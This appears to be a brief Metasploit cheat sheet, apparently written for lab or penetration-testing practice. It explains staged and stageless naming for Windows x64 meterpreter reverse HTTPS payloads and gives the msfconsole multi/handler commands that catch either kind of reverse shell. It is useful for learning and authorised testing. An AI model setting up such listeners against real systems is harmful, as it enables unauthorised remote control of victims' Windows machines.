# tldr


`windows_x64_meterpreter_https_staged_{ip}.exe` is equal to `windows/x64/meterpreter/reverse_https`
> Staged means there is a / (slash) between the word meterpreter and the type of comms it is using
> Stageless means there is an underscore
> in msfconsole you would run

msf> handler

# Handle a staged reverse HTTPS payload
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set payload windows/x64/meterpreter/reverse_https
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set lhost tun0 
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set lport 8443 (the default port)
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> exploit -j -z

# Handle a stageless reverse HTTPS payload
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set payload windows/x64/meterpreter_reverse_https
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set lhost tun0 
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set lport 8443 (the default port)
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> exploit -j -z

